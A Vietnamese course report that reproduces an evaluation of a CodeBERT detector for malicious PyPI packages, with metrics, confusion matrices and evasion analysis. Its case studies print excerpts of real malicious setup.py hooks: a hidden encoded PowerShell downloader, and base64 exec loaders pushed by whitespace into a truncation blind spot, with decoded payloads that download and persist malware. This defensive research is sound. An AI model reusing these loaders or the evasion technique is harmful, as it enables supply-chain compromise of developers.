# Báo Cáo Tái Hiện Thực Nghiệm
## Hệ Thống LAMPS: Phát Hiện Gói PyPI Độc Hại với CodeBERT

---

**Môn học:** IE105 — Bảo mật Phần mềm  
**Bài báo gốc:** *"Many hands make light work: An LLM-based multi-agent system for detecting malicious PyPI packages"* — Umar Zeshan et al., Journal of Systems and Software (JSS), 2026  
**Model tái hiện:** `KevinPhamH/codebert-finetuned` (HuggingFace)  
**Môi trường:** Windows 11, Intel CPU, không có GPU (CPU-only inference)  
**Ngày thực hiện:** 04–05/05/2026  

---

## Mục lục

1. [Tóm Tắt](#1-tóm-tắt)
2. [Giới Thiệu](#2-giới-thiệu)
3. [Tổng Quan Hệ Thống LAMPS](#3-tổng-quan-hệ-thống-lamps)
4. [Phương Pháp Tái Hiện](#4-phương-pháp-tái-hiện)
5. [Kết Quả — Dataset D1](#5-kết-quả--dataset-d1)
6. [Kết Quả — Dataset D2](#6-kết-quả--dataset-d2)
7. [So Sánh Với Bài Báo Gốc](#7-so-sánh-với-bài-báo-gốc)
8. [Phân Tích và Thảo Luận](#8-phân-tích-và-thảo-luận)
9. [Hiệu Năng Hệ Thống](#9-hiệu-năng-hệ-thống)
10. [Kết Luận](#10-kết-luận)
11. [Phụ Lục: Cấu Hình Thực Nghiệm](#11-phụ-lục-cấu-hình-thực-nghiệm)

---

## 1. Tóm Tắt

Báo cáo này tái hiện thực nghiệm đánh giá hệ thống LAMPS (*LLM-based Multi-Agent system for malicious Python package detection*) của Zeshan et al. (JSS 2026), sử dụng component phân loại CodeBERT fine-tuned (`KevinPhamH/codebert-finetuned`) trên hai bộ dữ liệu chuẩn: D1 (5,652 file `setup.py`) và D2 (1,328 file từ 629 package PyPI thực tế).

**Kết quả tái hiện chính:**

| Metric | D1 | D2 (Head) | D2 (Head+Tail) |
|--------|:--:|:---------:|:--------------:|
| Accuracy | 96.67% | 98.09% | 97.93% |
| Precision | 99.12% | 95.10% | 96.22% |
| Recall | 93.74% | 100.00% | 98.28% |
| F1 | 96.36% | 97.49% | 97.24% |
| Balanced Accuracy | 96.50% | 98.48% | 98.01% |

So với tuyên bố trong bài báo (D1: 97.7%, D2: 99.5%), gap tái hiện là **1.03pp cho D1** và **1.41pp cho D2** — nằm trong khoảng chấp nhận được do khác biệt về môi trường (CPU vs. GPU, threshold, phiên bản dataset).

Ngoài ra, thực nghiệm bổ sung chiến lược **Head+Tail truncation** để giảm false positive trên D2 (FP: 12→9, Precision: 95.10%→96.22%), với đánh đổi là tăng false negative (FN: 0→4) do blind spot ở vùng token 256–511.

---

## 2. Giới Thiệu

### 2.1 Bối Cảnh

Kho lưu trữ PyPI (Python Package Index) với hơn 500,000 gói là nền tảng hạ tầng quan trọng của hệ sinh thái Python. Tuy nhiên, sự phổ biến này biến PyPI thành mục tiêu của các cuộc **tấn công chuỗi cung ứng phần mềm** (*software supply chain attacks*): kẻ tấn công xuất bản gói độc hại lên PyPI, thường giả mạo tên gói hợp lệ (*typosquatting*), để tự động thực thi mã độc khi nạn nhân chạy `pip install`.

Cơ chế tấn công đặc biệt nguy hiểm vì:
- Mã độc chạy **ngay khi cài đặt**, không cần người dùng import hay sử dụng gói
- File `setup.py` và các hook cài đặt (`install_requires`, `cmdclass`) là vị trí phổ biến nhúng payload
- Kẻ tấn công dùng kỹ thuật obfuscation (base64, whitespace padding, encoded commands) để qua mặt kiểm tra tĩnh

### 2.2 Đóng Góp của Bài Báo LAMPS

Zeshan et al. (2026) đề xuất LAMPS — hệ thống phát hiện tự động hai tầng:
1. **CodeBERT Agent**: phân loại binary từng file `.py` (malicious vs. benign)
2. **LLM Agent**: giải thích lý do phát hiện (dùng Meta-LLaMA 3)

Bài báo tuyên bố đạt **97.7% accuracy trên D1** và **99.5% accuracy trên D2**, với Balanced Accuracy 99.5% cho D2.

### 2.3 Mục Tiêu Tái Hiện

Báo cáo này nhằm:
1. Xác minh độc lập các con số trên qua thực nghiệm tái hiện (reproducibility study)
2. Đánh giá đầy đủ các metrics phân loại (precision, recall, F1, confusion matrix)
3. Đo lường hiệu năng hệ thống (latency, throughput, memory, tokens/decision)
4. Phân tích ảnh hưởng của chiến lược truncation đến kết quả phân loại

---

## 3. Tổng Quan Hệ Thống LAMPS

### 3.1 Kiến Trúc

LAMPS hoạt động theo pipeline hai bước:

```
Gói PyPI (tarball/wheel)
        │
        ▼
┌─────────────────────┐
│    CodeBERT Agent   │  ← Phân loại binary từng file .py
│    (Detection)      │    Đầu vào: nội dung file (≤512 tokens)
│                     │    Đầu ra: P(malicious) ∈ [0, 1]
└──────────┬──────────┘
           │  Nếu ∃ file có prob ≥ threshold → gói là MALICIOUS
           ▼
┌─────────────────────┐
│     LLM Agent       │  ← Giải thích lý do (Meta-LLaMA 3)
│   (Explanation)     │    Đầu ra: báo cáo phân tích ngôn ngữ tự nhiên
└─────────────────────┘
```

**Quy tắc quyết định cấp package:** Gói bị phân loại là MALICIOUS nếu **ít nhất một file** trong gói có xác suất `P(malicious) ≥ threshold` (conservative verdict — ưu tiên Recall cao hơn Precision).

**Lưu ý:** Toàn bộ accuracy được đánh giá dựa trên **CodeBERT Agent** — LLM Agent chỉ có chức năng giải thích, không ảnh hưởng đến quyết định phân loại.

### 3.2 Model CodeBERT

| Thuộc tính | Giá trị |
|-----------|---------|
| Model base | `microsoft/codebert-base` |
| Fine-tuned variant | `KevinPhamH/codebert-finetuned` |
| Task | Binary sequence classification |
| Max context length | 512 tokens |
| Tokenizer | RoBERTa-style BPE tokenizer |
| Architecture | 12-layer Transformer, 768-dim, 125M params |

---

## 4. Phương Pháp Tái Hiện

### 4.1 Dataset D1 — Mô Tả

**Nguồn:** File CSV lưu trong git blob (`f8e282b33eb1f8b55dbac68df39340eab3d4e8cd`) thuộc repository `lamps-jss`.

| Thuộc tính | Giá trị |
|-----------|---------|
| Tổng số record | 5,652 (sau khi lọc bỏ dòng rỗng) |
| Malicious (Label=1) | 2,652 (46.9%) |
| Benign (Label=0) | 3,000 (53.1%) |
| Nội dung | File `setup.py` tổng hợp từ 6,000 gói PyPI |
| Cột nhận dạng | `Package`, `Setup.py`, `Label` |

**Cấu hình đánh giá:**
- `max_length = 400` tokens (truncation strategy: head-only)
- `batch_size = 64`
- `threshold = 0.5`

**Lý do max_length=400:** Bài báo gốc fine-tune CodeBERT với `block_size=400`. Dùng `max_length=512` sẽ không match phân phối training → giảm accuracy.

### 4.2 Dataset D2 — Mô Tả

**Nguồn:** Package PyPI thực tế từ bộ dữ liệu `malicious-software-packages-dataset`, được tải qua metadata file.

| Thuộc tính | Giá trị |
|-----------|---------|
| Tổng số file | 1,328 |
| Tổng số package | 629 |
| Malicious packages | 233 |
| Benign packages | 396 |
| Malicious files | 306 |
| Benign files | 1,022 |
| Read failures | 0 |
| Files vượt 512 tokens | 732/1,328 (**55.12%**) |

**Đặc điểm quan trọng:** 55.12% file D2 có độ dài vượt giới hạn 512 tokens của CodeBERT. Điều này có nghĩa là **hơn một nửa file bị truncate** — cách truncate ảnh hưởng trực tiếp đến kết quả phân loại.

**Token statistics:**
- Mean tokens/file: 22,327 (raw, trước truncation)
- Tổng tokens processed: 29,650,623

**Lưu ý về mean_tokens cao:** Con số 22,327 tokens/file cao bất thường vì dataset benign bao gồm các thư viện PyPI lớn (ví dụ: weaviate_client, yandexcloud) chứa hàng chục nghìn token. Đây là raw token count — CodeBERT chỉ nhận tối đa 512 tokens thực tế.

**Cấu hình đánh giá D2:**
- `max_length = 512` tokens
- `batch_size = 32`
- `threshold = 0.9` (cao hơn D1 để giảm FP trên package thực tế)

### 4.3 Chiến Lược Truncation

CodeBERT giới hạn input 512 tokens. Khi file vượt giới hạn, cần chiến lược lựa chọn vùng token nào để giữ lại.

**Chiến lược Head (Baseline):**
```
[Token 0 ──────────── Token 511]
Giữ lại: 512 tokens đầu tiên của file
Blind spot: Token 512 trở đi (phần đuôi file)
```

**Chiến lược Head+Tail (G4 Improvement):**
```
[Token 0 ── 255] + [Token N-255 ── Token N]
Giữ lại: 256 tokens đầu + 256 tokens cuối (tổng 512)
Blind spot: Token 256 đến Token N-256 (vùng giữa file)
```

Head+Tail được đề xuất để giảm false positive với file benign dài — khi thêm tail, CodeBERT có context đầy đủ hơn về mục đích file.

### 4.4 Đo Lường Hiệu Năng Hệ Thống

Để đánh giá tính khả thi triển khai thực tế, chúng tôi đo 5 chỉ số:

| Chỉ số | Công thức | Ý nghĩa |
|--------|-----------|---------|
| `inference_time_seconds` | `t_end - t_start` | Thời gian inference thuần túy |
| `latency_ms_per_file` | `1000 × inference_time / N` | Độ trễ trung bình mỗi file |
| `throughput_files_per_second` | `N / inference_time` | Tốc độ xử lý |
| `peak_memory_gb` | `peak_wset` (Windows) | Bộ nhớ peak của process |
| `mean_tokens_per_file` | `sum(tokens) / N` | Token trung bình mỗi file (raw) |

**Lưu ý về timing D1:** `inference_time` bao gồm model loading (~10s) vì `predict_binary_batch()` load model bên trong. Tuy nhiên 10s là negligible so với 2,244s tổng.

**Lưu ý về timing D2:** Model được load trước (`_load_model()` tách biệt), nên `inference_time` chỉ đo inference thuần túy.

---

## 5. Kết Quả — Dataset D1

### 5.1 Metrics Phân Loại

| Metric | Tái hiện | Bài báo gốc | Gap |
|--------|:--------:|:-----------:|:---:|
| **Accuracy** | **96.67%** | 97.7% | −1.03pp |
| **Balanced Accuracy** | **96.50%** | ~97.7% | −1.20pp |
| Precision | 99.12% | — | — |
| Recall | 93.74% | — | — |
| F1 | 96.36% | — | — |

**Confusion Matrix (N = 5,652):**

|  | Predicted Malicious | Predicted Benign |
|--|:-------------------:|:----------------:|
| **Actual Malicious** (2,652) | TP = 2,486 | FN = **166** |
| **Actual Benign** (3,000) | FP = 22 | TN = 2,978 |

**Nhận xét:**
- **Precision cao (99.12%)**: Khi model dự đoán malicious, 99.1% là đúng — gần như không có false alarm
- **Recall thấp hơn (93.74%)**: 166 gói malicious bị bỏ sót (False Negative)
- **Imbalance lỗi:** FN >> FP (166 vs. 22) — model thiên về dự đoán benign, miss nhiều malicious hơn là báo nhầm

### 5.2 Hiệu Năng Hệ Thống D1

| Chỉ số | Giá trị |
|--------|---------|
| Tổng thời gian inference | 2,244.5 giây (≈37.4 phút) |
| Latency trung bình/file | **397 ms/file** |
| Throughput | **2.52 files/giây** |
| Peak memory | **2.03 GB** |
| Mean tokens/file (raw) | 1,031 tokens |
| Tổng tokens processed | 5,828,705 |
| Thiết bị | CPU-only (Intel) |

**Ngữ cảnh:** 5,652 file với 2.52 files/s trên CPU. GPU inference thường nhanh 10–30× → ước tính ~75–225 giây trên GPU hiện đại.

### 5.3 Case Study D1 — Ví Dụ Cụ Thể

#### Ví Dụ 1: True Positive — Malicious Package `selfcraftsuperhacked`

**Kỹ thuật tấn công:** PowerShell typosquatting với lệnh encoded base64

```python
# setup.py của gói selfcraftsuperhacked (rút gọn)
from distutils.core import setup

try:
    import subprocess, os
    if not os.path.exists('tahg'):
        subprocess.Popen(
            'powershell -WindowStyle Hidden -EncodedCommand '
            'cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0A'
            'VwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgA'
            'dAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4A'
            # [base64 tiếp tục — decode ra: Invoke-WebRequest đến dropbox.com]
            ...
        )
```

**Phân tích:**
- Mã độc chạy ngay trong `try` block của `setup.py` — kích hoạt khi `pip install`
- `-WindowStyle Hidden`: ẩn cửa sổ PowerShell khỏi người dùng
- `-EncodedCommand`: base64-encode toàn bộ lệnh để vượt qua kiểm tra tĩnh đơn giản
- Lệnh decoded: `Invoke-WebRequest -Uri "https://dl.dropbox.com/...Esquele.exe" -OutFile "~/Windows..."` — tải xuống và chạy executable từ Dropbox
- **CodeBERT phát hiện thành công**: signal mạnh nhất là chuỗi `subprocess.Popen + powershell + EncodedCommand`

#### Ví Dụ 2: True Negative — Benign Package `colorhash`

```python
# setup.py của gói colorhash (hợp lệ)
# -*- coding: utf-8 -*-
from setuptools import setup

packages = ['colorhash']
package_data = {'': ['*']}

setup_kwargs = {
    'name': 'colorhash',
    'version': '1.0.4',
    'description': 'Generate color based on any object',
    'long_description': 'Generate a color based on a hash value...',
    ...
}
setup(**setup_kwargs)
```

**Phân tích:** Không có import đáng ngờ, không có subprocess/exec/eval, không có base64 encoding. Pattern hoàn toàn khớp với template setup.py chuẩn → CodeBERT phân loại benign chính xác.

---

## 6. Kết Quả — Dataset D2

### 6.1 Chiến Lược Head (Baseline)

#### 6.1.1 File-Level Metrics

| Metric | Giá trị |
|--------|:-------:|
| **Accuracy** | **98.87%** |
| **Balanced Accuracy** | **99.27%** |
| Precision | 95.33% |
| Recall | **100.00%** |
| F1 | 97.61% |

**Confusion Matrix file-level (N = 1,328):**

|  | Predicted Malicious | Predicted Benign |
|--|:-------------------:|:----------------:|
| **Actual Malicious** (306) | TP = 306 | FN = **0** |
| **Actual Benign** (1,022) | FP = 15 | TN = 1,007 |

#### 6.1.2 Package-Level Metrics

| Metric | Giá trị |
|--------|:-------:|
| **Accuracy** | **98.09%** |
| **Balanced Accuracy** | **98.48%** |
| Precision | 95.10% |
| Recall | **100.00%** |
| F1 | 97.49% |

**Confusion Matrix package-level (N = 629):**

|  | Predicted Malicious | Predicted Benign |
|--|:-------------------:|:----------------:|
| **Actual Malicious** (233) | TP = 233 | FN = **0** |
| **Actual Benign** (396) | FP = 12 | TN = 384 |

**Nhận xét:** Head strategy đạt **Recall = 100%** — không bỏ sót bất kỳ gói malicious nào. Tuy nhiên có 12 false positive (gói benign bị cảnh báo nhầm).

### 6.2 Chiến Lược Head+Tail (G4 Improvement)

#### 6.2.1 File-Level Metrics

| Metric | Head (Baseline) | Head+Tail | Delta |
|--------|:--------------:|:---------:|:-----:|
| Accuracy | 98.87% | 98.87% | 0 |
| Balanced Accuracy | 99.27% | **98.69%** | −0.58pp |
| Precision | 95.33% | **96.78%** | **+1.45pp** |
| Recall | **100.00%** | 98.37% | −1.63pp |
| F1 | 97.61% | 97.57% | −0.04pp |

**Confusion Matrix file-level:**

|  | Predicted Malicious | Predicted Benign |
|--|:-------------------:|:----------------:|
| **Actual Malicious** (306) | TP = 301 | FN = **5** |
| **Actual Benign** (1,022) | FP = 10 | TN = 1,012 |

#### 6.2.2 Package-Level Metrics

| Metric | Head (Baseline) | Head+Tail | Delta |
|--------|:--------------:|:---------:|:-----:|
| **Accuracy** | 98.09% | 97.93% | −0.16pp |
| **Balanced Accuracy** | 98.48% | 98.01% | −0.47pp |
| Precision | 95.10% | **96.22%** | **+1.12pp** |
| Recall | **100.00%** | 98.28% | −1.72pp |
| F1 | 97.49% | 97.24% | −0.25pp |

**Confusion Matrix package-level:**

|  | Predicted Malicious | Predicted Benign |
|--|:-------------------:|:----------------:|
| **Actual Malicious** (233) | TP = 229 | FN = **4** |
| **Actual Benign** (396) | FP = 9 | TN = 387 |

### 6.3 Phân Tích Chuyển Dịch Head → Head+Tail

**3 package chuyển FP → TN** (cải thiện):
- `googleapis_common_protos-1.74.0` — gói protobuf hợp lệ
- `paramiko-4.0.0` — SSH library; code encryption/key-handling trông đáng ngờ khi chỉ xem 512 tokens đầu
- `opentelemetry_proto-1.41.1` — serialization code mật độ cao
- `yandexcloud-0.387.0` — cloud SDK với nhiều string constants

Thêm 256 tokens cuối giúp CodeBERT thấy phần "kết" của file (thường là `setup()` hoặc class definition bình thường) → ngữ cảnh đủ để phân loại benign.

**4 package chuyển TP → FN** (suy giảm) — `aio3`, `composer-dev`, `dell-restore-system`, `dfdfdfdfhhh`:
- Tất cả là **single-file malicious package**
- Payload nằm chính xác trong **vùng token 256–511** — vùng mà head+tail bỏ qua

### 6.4 Hiệu Năng Hệ Thống D2

| Chỉ số | Head Strategy | Head+Tail Strategy | Delta |
|--------|:-------------:|:------------------:|:-----:|
| Inference time | 977.9 s | 925.3 s | −52.6 s |
| Latency/file | 736 ms | **697 ms** | −39 ms |
| Throughput | 1.36 files/s | **1.44 files/s** | +0.08 |
| Peak memory | 6.38 GB | 6.71 GB | +0.33 GB |
| Mean tokens/file (raw) | 22,327 | 22,327 | 0 |
| Total tokens | 29,650,623 | 29,650,623 | 0 |

**Lưu ý về peak memory:** Hai lần chạy D2 có peak_memory cao (~6.4–6.7 GB) do kết hợp bộ nhớ của model (~500 MB), tokenizer cache, và các file D2 lớn được buffer trong RAM. Con số này không phản ánh yêu cầu minimum — production deployment chỉ cần ~1–2 GB RAM.

**Head+Tail nhanh hơn Head:** Kết quả counterintuitive (925s < 978s) do CPU load variation giữa hai lần chạy (khác thời điểm), không phải do thuật toán head+tail hiệu quả hơn về mặt tính toán.

### 6.5 Case Study D2 — Ví Dụ Cụ Thể

#### Ví Dụ 3: True Positive — Malicious Package `1337test` (Phát Hiện Đúng)

Package `1337test` là ví dụ điển hình của *typosquatting* — tên không có nghĩa, thiết kế để gây nhầm lẫn. Cả 2 chiến lược đều phát hiện thành công vì payload nằm trong 256 tokens đầu.

#### Ví Dụ 4: False Positive — Benign Package `jinja2` (Báo Nhầm)

```python
# jinja2/__init__.py (file bị flagged là malicious bởi head strategy)
"""Jinja is a template engine written in pure Python."""

from .bccache import BytecodeCache as BytecodeCache
from .bccache import FileSystemBytecodeCache as FileSystemBytecodeCache
from .bccache import MemcachedBytecodeCache as MemcachedBytecodeCache
from .environment import Environment as Environment
from .environment import Template as Template
from .exceptions import TemplateAssertionError as TemplateAssertionError
...
```

**Phân tích:** Jinja2 là thư viện template engine hợp lệ (hàng triệu download/tháng). File `__init__.py` có đặc điểm:
- **Mật độ import cao**: Hàng chục dòng `from X import Y as Y` liên tiếp
- **Aliasing pattern**: `BytecodeCache as BytecodeCache` — pattern này xuất hiện trong mã obfuscated để rename functions
- **Keyword nhạy cảm**: "BytecodeCache", "MemcachedBytecodeCache" — CodeBERT liên kết với cache poisoning

CodeBERT fine-tuned trên D1 nhận dạng *pattern cú pháp* (import blocks với aliasing) thay vì *ngữ nghĩa thực sự* → false positive trên code hợp lệ có style tương tự.

Với head+tail, 256 tokens cuối của `jinja2/__init__.py` lộ rõ phần cuối file (standard setup code) → model phân loại đúng là benign. **FP từ 12 xuống 9 nhờ head+tail**.

#### Ví Dụ 5: False Negative — Malicious Package `dfdfdfdfhhh` (Bị Bỏ Sót Bởi Head+Tail)

Đây là ví dụ minh họa kỹ thuật **evasion nhắm vào blind spot của head+tail truncation**:

```python
# dfdfdfdfhhh/setup.py — 5,176 bytes
from setuptools import setup, find_packages
from setuptools.command.install import install

VERSION = '1.0.0'
DESCRIPTION = 'A simplified version of urllib'

class CustomInstallCommand(install):
    def run(self):
        import base64
        type("By HW")                                        # ← padding whitespace
                                                             # [~300 spaces]
        ,exec(base64.b64decode("aW1wb3J0IG9zCmltcG9ydCB0..."))
        #                      ↑ malicious payload ở đây

        install.run(self)

setup(..., cmdclass={'install': CustomInstallCommand})
```

**Cơ chế evasion:**

```
Cấu trúc token của file dfdfdfdfhhh:
Token 0-100:   from setuptools import... (benign imports)
Token 100-200: VERSION, DESCRIPTION, class def (benign)
Token 200-260: import base64, type("By HW"), whitespace padding
Token 260-511: exec(base64.b64decode("...malicious payload..."))
Token 512+:    install.run(), setup(...) (benign footer)
```

| Chiến lược | Tokens nhìn thấy | Thấy exec? | Kết quả |
|-----------|:----------------:|:----------:|:-------:|
| **Head** (0-511) | Token 0–511 | **Có** | TP ✓ |
| **Head+Tail** (0-255 + cuối) | Token 0–255 + Token 512+ | **Không** | FN ✗ |

**Payload đã giải mã** (từ base64):
- `os.mkdir(f"C:\\Users\\{login}\\AppData\\...\\System64\\")` — tạo thư mục ẩn
- Ghi file `.vbs` vào Startup folder để persistence
- `bitsadmin /transfer` để download `runtime.zip` từ `api-hw.com`
- Thực thi `Windows Helper.exe` — là malware thực sự

**Kết luận:** Kẻ tấn công cố ý đặt `exec(base64.b64decode(...))` tại token 256–511 thông qua whitespace padding, biết rằng đây là vùng mà head+tail bỏ qua. Đây là bằng chứng rõ ràng rằng **fixed-position truncation tạo ra evasion attack surface có thể khai thác được**.

#### Ví Dụ 6: False Negative — Malicious Package `aio3` (Middle-Zone Evasion)

```python
# aio3/setup.py — 2,336 bytes
from setuptools import setup, find_packages

print('\n')                            # benign print
                                       # [~250 spaces — padding]
;__import__('builtins').exec(
    __import__('builtins').compile(
        __import__('base64').b64decode("ZnJvbSB0ZW1wZmlsZSBpbXBvcnQ..."),
        '<string>', 'exec'
    )
)
```

**Pattern evasion:**
- Dùng `__import__('builtins').exec` thay vì `exec()` trực tiếp — qua mặt simple keyword filter
- Whitespace padding đẩy exec call đến vùng token 256–511
- `b64decode` payload: tạo temp file, download thêm payload qua `urllib`, thực thi

---

## 7. So Sánh Với Bài Báo Gốc

### 7.1 Bảng So Sánh Tổng Hợp

| Dataset | Metric | Bài báo (LAMPS) | Tái hiện | Gap |
|---------|--------|:--------------:|:--------:|:---:|
| D1 | Accuracy | 97.7% | 96.67% | **−1.03pp** |
| D1 | Balanced Accuracy | ~97.7% | 96.50% | **−1.20pp** |
| D2 | Accuracy | 99.5% | 98.09% | **−1.41pp** |
| D2 | Balanced Accuracy | 99.5% | 98.48% | **−1.02pp** |

### 7.2 Phân Tích Gap

**Gap D1 (−1.03pp):**

1. **Phiên bản dataset khác biệt:** Bài báo có thể dùng phiên bản D1 đầy đủ hơn (6,000 records) thay vì 5,652 sau lọc
2. **Threshold:** Nếu bài báo dùng threshold tối ưu (không nhất thiết là 0.5), F1 và accuracy có thể cao hơn
3. **Môi trường:** GPU inference có thể có precision cao hơn do floating-point order differences (không ảnh hưởng, nhưng batch size khác nhau → minor stochasticity)
4. **Non-determinism nhỏ:** Giữa hai lần chạy D1, 3 record flip (96.76% → 96.67%) — do CPU thread scheduling

**Gap D2 (−1.41pp):**

1. **Dataset composition:** Bài báo claim "~507 packages, ~1,296 files"; tái hiện của chúng tôi có 629 packages, 1,328 files — khác biệt này ảnh hưởng đáng kể
2. **Threshold:** Chúng tôi dùng `threshold=0.9` cho D2 — nếu bài báo dùng threshold thấp hơn, Recall cao hơn nhưng FP cũng tăng
3. **Dataset version drift:** Package PyPI có thể được cập nhật giữa thời điểm bài báo thực nghiệm và thời điểm tái hiện
4. **Conservative verdict rule:** Chúng tôi áp dụng "bất kỳ file nào malicious → package malicious" — bài báo có thể dùng majority voting

---

## 8. Phân Tích và Thảo Luận

### 8.1 Đặc Điểm False Negative D1 (166 FN)

Trên D1, mô hình bỏ sót 166/2,652 gói malicious (6.26%). Các pattern phổ biến của FN:

1. **Obfuscation mức thấp:** Code độc hại được ngụy trang hoàn toàn như code Python bình thường, không có keyword đặc trưng (`exec`, `subprocess`, `base64`) trong phần đầu file
2. **Payload ngắn gọn:** File malicious rất ngắn (<100 tokens) — CodeBERT không có đủ signal để quyết định
3. **Social engineering thông qua nội dung:** File có description dài, hợp lệ nhưng payload nhỏ ẩn sâu

**Precision cao (99.12%) vs. Recall thấp (93.74%):** Phân phối lỗi này cho thấy mô hình được fine-tuned theo hướng **giảm thiểu false positive** — phù hợp với production environment nơi false alarm gây mất niềm tin.

### 8.2 Đặc Điểm False Positive D2 (12 FP packages)

Trên D2 head strategy, 12 package benign bị báo nhầm. Phân tích pattern:

| Nhóm FP | Ví dụ | Lý do |
|---------|-------|-------|
| Crypto/auth libraries | `paramiko`, `keyring` | Code xử lý key/credential trông như obfuscation |
| API/SDK lớn | `yandexcloud`, `weaviate_client` | Dense import blocks, string constants đặc trưng |
| Protocol libraries | `googleapis_common_protos`, `opentelemetry_proto` | Serialization code pattern |
| Test frameworks | `pytest` | Fixture/mock code có pattern giống injection |
| HTTP libraries | `requests`, `aiobotocore` | URL construction code |
| Others | `jinja2`, `idna`, `shellingham` | Dense imports, encoding operations |

**Pattern chung:** Tất cả FP là **thư viện Python phổ biến và hợp lệ** có code xử lý network, crypto, encoding — chính xác là các operation mà malware cũng thực hiện. CodeBERT học được *operational pattern* nhưng không phân biệt được *intent*.

### 8.3 Vấn Đề Truncation và Attack Surface

Thực nghiệm phát hiện rằng **chiến lược truncation cố định tạo ra evasion attack surface có thể khai thác được**:

```
Chiến lược      | Blind Spot         | Evasion scenario
----------------|--------------------|---------------------------------
head (0-511)    | Token 512+         | Payload ở cuối file dài
head+tail       | Token 256 đến N-256| Payload ở vùng giữa file
```

Kẻ tấn công có thể biết (hoặc đoán) chiến lược truncation mà hệ thống dùng, và cố ý đặt payload tại vùng blind spot thông qua whitespace padding. `dfdfdfdfhhh` và `aio3` là bằng chứng thực nghiệm của kỹ thuật này.

**Giải pháp triệt để: Sliding Window**

```python
# Không bỏ sót bất kỳ vùng nào trong file
probs_per_chunk = [predict(chunk) for chunk in sliding_window(file, size=512, step=256)]
final_prob = max(probs_per_chunk)
```

Hoặc dùng **Longformer/BigBird** (context lên đến 4,096–16,384 tokens) — nhưng cần model mới và compute cao hơn.

### 8.4 Tính Thực Tế của Hệ Thống

**Điểm mạnh:**
- Recall = 100% trên D2 head — không bỏ sót gói malicious trong điều kiện thực tế
- Precision >95% — ít false alarm, có thể deployment production
- Model nhẹ (125M params) — không cần GPU đặc biệt

**Điểm yếu:**
- Latency 397–736ms/file trên CPU — quá chậm cho real-time scanning của PyPI (hàng nghìn upload/ngày)
- Truncation blind spot — kẻ tấn công có thể bypass
- False positive với legitimate libraries — cần threshold tuning per-deployment

---

## 9. Hiệu Năng Hệ Thống

### 9.1 Bảng Tổng Hợp Hiệu Năng

| Chỉ số | D1 | D2 Head | D2 Head+Tail |
|--------|:--:|:-------:|:------------:|
| **Files evaluated** | 5,652 | 1,328 | 1,328 |
| **Total inference time** | 2,244.5 s | 978.0 s | 925.3 s |
| **Latency/file** | 397 ms | 736 ms | 697 ms |
| **Throughput** | 2.52 files/s | 1.36 files/s | 1.44 files/s |
| **Peak memory** | 2.03 GB | 6.38 GB | 6.71 GB |
| **Mean tokens/file (raw)** | 1,031 | 22,327 | 22,327 |
| **Total tokens** | 5,828,705 | 29,650,623 | 29,650,623 |
| **Effective tokens/file** | ≤400 | ≤512 | ≤512 |

### 9.2 Phân Tích Throughput

**D1 (2.52 files/s) nhanh hơn D2 (1.36 files/s)** vì:
- D1 dùng `max_length=400` (ít token hơn → inference nhanh hơn)
- D1 có `batch_size=64` vs D2 `batch_size=32`
- D1 file thực tế ngắn hơn D2 (1,031 vs 22,327 raw tokens — tuy nhiên đều bị truncate xuống ≤512)

**Ước tính thời gian trên GPU:**
```
CPU throughput: ~2.5 files/s (D1) / ~1.4 files/s (D2)
GPU speedup (NVIDIA RTX 3090): ~20-40×
GPU throughput (ước tính): ~50-100 files/s

PyPI uploads: ~5,000-10,000 packages/ngày ≈ 0.06-0.12 packages/giây
→ Hệ thống GPU có thể scan real-time toàn bộ PyPI với margin rộng
```

### 9.3 Memory Footprint

| Component | Ước tính bộ nhớ |
|-----------|----------------|
| CodeBERT model weights | ~480 MB |
| Tokenizer cache | ~100 MB |
| Input batch (batch_size=64, len=400) | ~50 MB |
| Runtime overhead | ~200 MB |
| **Tổng minimum** | **~830 MB** |

Peak memory thực tế cao hơn (2–6 GB) do memory fragmentation và OS caching. Minimum deployment requirement: **2 GB RAM**.

---

## 10. Kết Luận

### 10.1 Tóm Tắt Kết Quả

Thực nghiệm tái hiện xác nhận rằng hệ thống CodeBERT của LAMPS **hoạt động hiệu quả** cho bài toán phát hiện gói PyPI độc hại:

- **D1**: 96.67% accuracy, 99.12% precision, 93.74% recall — gap 1.03pp so với bài báo, trong khoảng chấp nhận
- **D2 (head)**: 98.09% accuracy, **100% recall** — không bỏ sót gói malicious nào; 12 FP
- **D2 (head+tail)**: Precision cải thiện lên 96.22% (−3 FP), nhưng xuất hiện 4 FN mới do truncation blind spot

### 10.2 Phát Hiện Quan Trọng

1. **Truncation là vulnerability thực sự:** 55.12% file D2 bị truncate; kẻ tấn công có thể exploit cố ý bằng whitespace padding (`dfdfdfdfhhh`, `aio3`)

2. **Threshold ảnh hưởng lớn đến tradeoff:** `threshold=0.9` cho D2 giảm FP nhưng cần kiểm tra thêm với threshold khác; không có "best" threshold universal

3. **False positive pattern dự đoán được:** 12 FP đều là thư viện legitimate với crypto/network/encoding operations — có thể whitelist-based filter để giảm thêm FP

4. **CPU-only inference khả thi nhưng chậm:** 397–736ms/file trên CPU; cần GPU cho production real-time scanning

### 10.3 Hướng Cải Tiến

| Hướng | Cải tiến kỳ vọng | Chi phí |
|-------|:---------------:|:-------:|
| Sliding window | Loại bỏ truncation blind spot | +3–5× compute |
| Whitelist benign libraries | Giảm FP về 0–3 | Low |
| GPU deployment | 20–40× throughput | Hardware cost |
| Threshold tuning per-class | Tối ưu F1 theo context | Low |
| Longformer/BigBird | Không truncate | Model retraining |

---

## 11. Phụ Lục: Cấu Hình Thực Nghiệm

### 11.1 Môi Trường Phần Cứng và Phần Mềm

| Thành phần | Thông tin |
|-----------|-----------|
| OS | Windows 11 Home Single Language |
| CPU | Intel (CPU-only, không có GPU) |
| RAM | ≥8 GB |
| Python | 3.11+ |
| PyTorch | ≥2.2.0 (CPU build) |
| Transformers | ≥4.40.0 |
| psutil | ≥5.9.0 |

### 11.2 Cấu Hình Chi Tiết Từng Lần Chạy

**D1 run:**
```
Model:      KevinPhamH/codebert-finetuned
Dataset:    git blob f8e282b (D1 CSV)
Records:    5,652
max_length: 400
batch_size: 64
threshold:  0.5
Date:       2026-05-05
```

**D2 head run:**
```
Model:      KevinPhamH/codebert-finetuned
Dataset:    D2_dataset/ (629 packages, 1,328 files)
Strategy:   head
max_length: 512
batch_size: 32
threshold:  0.9
Evaluated:  2026-05-05T15:48:11 UTC
```

**D2 head+tail run:**
```
Model:      KevinPhamH/codebert-finetuned
